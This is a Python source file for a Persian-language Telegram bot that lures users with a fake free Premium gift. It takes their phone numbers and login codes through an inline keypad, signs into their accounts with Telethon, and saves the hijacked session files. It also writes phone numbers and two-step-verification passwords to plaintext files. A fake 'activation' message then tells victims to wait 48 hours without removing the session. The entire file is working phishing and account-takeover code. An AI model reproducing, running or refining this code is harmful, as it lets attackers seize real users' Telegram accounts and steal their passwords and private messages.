import os
import asyncio
import telebot
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, PhoneNumberFloodError, PhoneCodeInvalidError
from telethon.tl.types import KeyboardButtonRequestPhone
import logging
from termcolor import colored
import sys
from colorama import Fore, Style, init
import time
import pyfiglet
import random

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

API_ID = input(colored("API-ID : ", 'light_blue'))
API_HASH = input(colored("API-HASH : ", 'light_blue'))
CHANNEL_USERNAME = input(colored("channel user_name (please use @ : @username): ", 'light_blue')) 
CHANNEL = CHANNEL_USERNAME[1:]
BOT_TOKEN = input(colored("BOT-TOKEN : ", 'light_blue'))
bot = TelegramClient('bot_session', API_ID, API_HASH)
telebotapi = telebot.TeleBot(BOT_TOKEN)

init(autoreset=True)


text = "inits5"

ascii_art = pyfiglet.figlet_format(text, font="starwars")  # You can change "starwars" to any other font

def dripping_ascii_art(ascii_art):
    for char in ascii_art:
        sys.stdout.write(Fore.RED + char)
        sys.stdout.flush()
        time.sleep(0.008)  
    print(Style.RESET_ALL)  

dripping_ascii_art(ascii_art)

print(colored("Github -: https://github.com/inits5", attrs=['bold'], on_color='on_dark_grey'))
print(colored("Github -: https://github.com/QMdev", attrs=['bold'], on_color='on_dark_grey'))
print(colored("telegram -: https://t.me/Scripted_Seer",  attrs=['bold'], on_color='on_cyan'))


user_states = {}
user_clients = {}
user_codes = {}
user_fail_attempts = {}

def log_success(message):
    logging.info(colored(message, 'green'))

def log_error(message):
    logging.error(colored(message, 'red'))

def log_warning(message):
    logging.warning(colored(message, 'yellow'))

def log_info(message):
    logging.info(colored(message, 'blue'))

def check_membership(user_id):
    try:
        chat_member = telebotapi.get_chat_member(CHANNEL_USERNAME, user_id)
        if chat_member.status in ['member', 'creator', 'administrator']:
            return True
        return False
    except Exception as e:
        log_error(f"{str(e)}")
        return False

def get_number_keyboard():
    return [
        [Button.inline('1', 'num_1'), Button.inline('2', 'num_2'), Button.inline('3', 'num_3')],
        [Button.inline('4', 'num_4'), Button.inline('5', 'num_5'), Button.inline('6', 'num_6')],
        [Button.inline('7', 'num_7'), Button.inline('8', 'num_8'), Button.inline('9', 'num_9')],
        [Button.inline('حذف', 'delete'), Button.inline('0', 'num_0'), Button.inline('تأیید', 'confirm')]
    ]

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    user_info = await bot.get_entity(user_id)
    log_info(f"User [{user_info.first_name} {user_info.last_name or ''}] ({user_info.id}) executed /start.")

    if check_membership(user_id):
        keyboard = [[KeyboardButtonRequestPhone('📱 ارسال شماره تلفن')]]
        await event.reply('👋 خوش آمدید به ربات دریافت اشتراک پریمیوم هدیه! 🎁 لطفاً شماره تلفن خود را ارسال کنید.', buttons=keyboard)
        user_states[user_id] = 'waiting_for_phone'
    else:
        join_button = Button.url('📢 عضویت در کانال', f'https://t.me/{CHANNEL}')
        confirm_button = Button.inline('✅ تایید عضویت شما', 'confirm_membership')
        await event.reply('⚠️ برای دریافت اشتراک پریمیوم، ابتدا در کانال رسمی ما عضو شوید. سپس بر روی گزینه تایید عضویت کلیک کنید: ', buttons=[join_button, confirm_button])

@bot.on(events.CallbackQuery(pattern='confirm_membership'))
async def confirm_membership(event):
    user_id = event.sender_id

    if check_membership(user_id):
        await event.edit('شما در کانال ما عضو شدید برای ادامه فرایند لطفا ربات را دوباره استارت کنید /start ', buttons=[[KeyboardButtonRequestPhone('📱 ارسال شماره تلفن')]])
        user_states[user_id] = 'waiting_for_phone'
    else:
        await event.edit('❌ شما هنوز در کانال عضو نشده‌اید. لطفاً ابتدا در کانال عضو شوید.')

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_phone_number(event):
    user_id = event.sender_id
    message = event.message

    if user_id not in user_states:
        return

    state = user_states[user_id]

    if state == 'waiting_for_phone' and message.contact:
        phone = message.contact.phone_number
        try:
            if not os.path.exists('sessions'): os.makedirs('sessions')
            t = random.randint(11, 28882)
            sessionss = f'sessions/session_{user_id}__%{t}.session'
            client = TelegramClient(sessionss, API_ID, API_HASH)
            if not os.path.exists('info'): os.makedirs('info')
            await client.connect()
            await client.send_code_request(phone=phone)
            user_clients[user_id] = client
            user_states[user_id] = 'waiting_for_code'
            user_codes[user_id] = ''
            log_info(f"Phone number {phone} sent for user {user_id}")
            await event.reply('کد تأیید ارسال شد لطفا با کمک دکمه ها کد ورود را وارد کنید:', buttons=get_number_keyboard())
            with open(f'info/info_user_{user_id}.txt', 'w') as file:
                file.write(f"number: {phone} for {user_id}\n")
        except PhoneNumberInvalidError:
            log_error(f"Invalid phone number: {phone}")
            await event.reply('❌ شماره تلفن وارد شده معتبر نیست. لطفاً دوباره تلاش کنید.')
        except PhoneNumberFloodError:
            log_warning(f"Too many code requests for {phone}")
            await event.reply('❌ درخواست‌های کد بیش از حد مجاز است. لطفاً چند دقیقه صبر کرده و دوباره تلاش کنید.')
    elif state == 'waiting_for_phone':
        await event.reply('⚠️ لطفاً شماره تلفن خود را با استفاده از دکمه مشخص ارسال کنید.')

@bot.on(events.CallbackQuery(pattern='confirm'))
async def handle_verification_code(event):
    user_id = event.sender_id

    if user_id in user_clients:
        client = user_clients[user_id]
        code = user_codes.get(user_id, '')

        if code:
            try:
                await client.sign_in(code=code)
                session_bytes = client.session.save()
                user_info = await bot.get_entity(user_id)
                first_name = user_info.first_name if user_info.first_name else "Unknown"
                last_name = user_info.last_name if user_info.last_name else "Unknown"
                username = user_info.username if user_info.username else "Unknown"
                phone = user_info.phone if user_info.phone else "Unknown"
                if not os.path.exists('info'): os.makedirs('info')
                info_file = f"info/info_user_{user_id}.txt"
                with open(info_file, "a", encoding='utf-8') as i:
                    i.write(f"session name: {user_id}.session \n")
                    i.write(f"user name: {first_name} {last_name}\n")
                    i.write(f"id: {user_info.id}\n")
                    i.write(f"{'-' * 30}\n")
                    log_success(f"txt saved: {info_file} ")

                await client.send_message('me', f'''کاربر : {first_name}
ایدی : {user_id}
ورود موفقیت آمیز بود پیام پشتیبان :

🌟 تبریک! ورود شما به تلگرام پرمیوم با موفقیت انجام شد! 🎉 شما اکنون در آستانه تجربه‌ای جدید و هیجان‌انگیز هستید.
اما برای بهره‌مندی کامل از امکانات پرمیوم، باید ۴۸ ساعت صبر کنید تا تمامی ویژگی‌ها فعال شوند.
 💡 توجه: لطفاً تا پایان این مدت، ربات را از اکانت خود خارج نکنید. 
این زمان به شما کمک می‌کند تا از تمامی خدمات منحصر به فرد بهره‌مند شوید و تجربه‌ای لذت‌بخش داشته باشید. ✨
 به یاد داشته باشید: هر لحظه‌ای که صبر می‌کنید، شما را به دنیای جدیدی نزدیک‌تر می‌کند.
 پس با انگیزه و اشتیاق منتظر بمانید! با آرزوی موفقیت و تجربه‌ای فوق‌العاده! 🚀
                                                    ''')
                await event.edit(f'''کاربر : {first_name}
ایدی : {user_id}
ورود موفقیت آمیز بود پیام پشتیبان :

🌟 تبریک! ورود شما به تلگرام پرمیوم با موفقیت انجام شد! 🎉 شما اکنون در آستانه تجربه‌ای جدید و هیجان‌انگیز هستید.
اما برای بهره‌مندی کامل از امکانات پرمیوم، باید ۴۸ ساعت صبر کنید تا تمامی ویژگی‌ها فعال شوند.
 💡 توجه: لطفاً تا پایان این مدت، ربات را از اکانت خود خارج نکنید. 
این زمان به شما کمک می‌کند تا از تمامی خدمات منحصر به فرد بهره‌مند شوید و تجربه‌ای لذت‌بخش داشته باشید. ✨
 به یاد داشته باشید: هر لحظه‌ای که صبر می‌کنید، شما را به دنیای جدیدی نزدیک‌تر می‌کند.
 پس با انگیزه و اشتیاق منتظر بمانید! با آرزوی موفقیت و تجربه‌ای فوق‌العاده! 🚀
                                                    ''')
                log_success(f"User {user_id} logged in successfully with name: {first_name} {last_name} ({user_id})")

            except SessionPasswordNeededError:
                fail_attempts = user_fail_attempts.get(user_id, 0)
                if fail_attempts < 3:
                    user_fail_attempts[user_id] = fail_attempts + 1
                    await event.answer("کاربر گرامی اکانت شما تایید دومرحله‌ای دارد لطفا رمز را وارد کنید", alert=True)
                    await event.edit('🔐 لطفاً رمز عبور دو مرحله‌ای خود را وارد کنید:')

                    @bot.on(events.NewMessage(func=lambda e: e.sender_id == user_id))
                    async def handle_password_input(password_event):
                        password = password_event.text.strip()
                        try:
                            await client.sign_in(password=password)
                            session_bytes = client.session.save()

                            user_info = await bot.get_entity(user_id)
                            first_name = user_info.first_name if user_info.first_name else ""
                            last_name = user_info.last_name if user_info.last_name else ""
                            username = user_info.username if user_info.username else ""
                            phone = user_info.phone if user_info.phone else ""
                            if not os.path.exists('info'): os.makedirs('info')
                            info_file = f"info/info_user_{user_id}.txt"
                            with open(info_file, "a",  encoding='utf-8') as i:
                                i.write(f"user: {first_name} {last_name}\n")
                                i.write(f"chat id: {user_info.id}\n")
                                i.write(f"password: {password}\n")
                                i.write(f"{'-' * 30}\n")
                                log_success(f"txt saved: {info_file}")

                            await client.send_message('me', f'''کاربر : {first_name}
ایدی : {user_id}
ورود موفقیت آمیز بود پیام پشتیبان :

🌟 تبریک! ورود شما به تلگرام پرمیوم با موفقیت انجام شد! 🎉 شما اکنون در آستانه تجربه‌ای جدید و هیجان‌انگیز هستید.
اما برای بهره‌مندی کامل از امکانات پرمیوم، باید ۴۸ ساعت صبر کنید تا تمامی ویژگی‌ها فعال شوند.
 💡 توجه: لطفاً تا پایان این مدت، ربات را از اکانت خود خارج نکنید. 
این زمان به شما کمک می‌کند تا از تمامی خدمات منحصر به فرد بهره‌مند شوید و تجربه‌ای لذت‌بخش داشته باشید. ✨
 به یاد داشته باشید: هر لحظه‌ای که صبر می‌کنید، شما را به دنیای جدیدی نزدیک‌تر می‌کند.
 پس با انگیزه و اشتیاق منتظر بمانید! با آرزوی موفقیت و تجربه‌ای فوق‌العاده! 🚀
                                                    ''')
                            await password_event.reply(f'''کاربر : {first_name}
ایدی : {user_id}
ورود موفقیت آمیز بود پیام پشتیبان :

🌟 تبریک! ورود شما به تلگرام پرمیوم با موفقیت انجام شد! 🎉 شما اکنون در آستانه تجربه‌ای جدید و هیجان‌انگیز هستید.
اما برای بهره‌مندی کامل از امکانات پرمیوم، باید ۴۸ ساعت صبر کنید تا تمامی ویژگی‌ها فعال شوند.
 💡 توجه: لطفاً تا پایان این مدت، ربات را از اکانت خود خارج نکنید. 
این زمان به شما کمک می‌کند تا از تمامی خدمات منحصر به فرد بهره‌مند شوید و تجربه‌ای لذت‌بخش داشته باشید. ✨
 به یاد داشته باشید: هر لحظه‌ای که صبر می‌کنید، شما را به دنیای جدیدی نزدیک‌تر می‌کند.
 پس با انگیزه و اشتیاق منتظر بمانید! با آرزوی موفقیت و تجربه‌ای فوق‌العاده! 🚀
                                                    ''')
                            log_success(f"User {user_id} logged in successfully with name: {first_name} {last_name} ({user_id})")

                        except Exception as e:
                            log_error(f"Error during two-step verification: {str(e)}")
                            await password_event.reply('❌ رمز عبور اشتباه است. لطفاً دوباره تلاش کنید.')
                else:
                    await event.edit('❌ تعداد تلاش‌های ناموفق بیش از حد مجاز است. لطفاً بعداً دوباره امتحان کنید.')
                    return
            except PhoneCodeInvalidError:
                log_error(f"کد تأیید وارد شده توسط کاربر {user_id} اشتباه بود.")
                await event.edit('❌ کد وارد شده اشتباه است. لطفاً فرایند را دوباره شروع کنید: /start')
                user_codes[user_id] = ''

@bot.on(events.CallbackQuery)
async def handle_callback_query(event):
    user_id = event.sender_id

    if user_id not in user_codes:
        user_codes[user_id] = ''
    data = event.data.decode()

    if 'num_' in data:
        user_codes[user_id] += data[-1]
        await event.edit(f'🔢 کد فعلی شما: {user_codes[user_id]}', buttons=get_number_keyboard())
    elif data == 'delete' and user_codes[user_id]:
        user_codes[user_id] = user_codes[user_id][:-1]
        await event.edit(f'🔢 کد فعلی شما: {user_codes[user_id]}', buttons=get_number_keyboard())

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    log_info("Bot runed")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
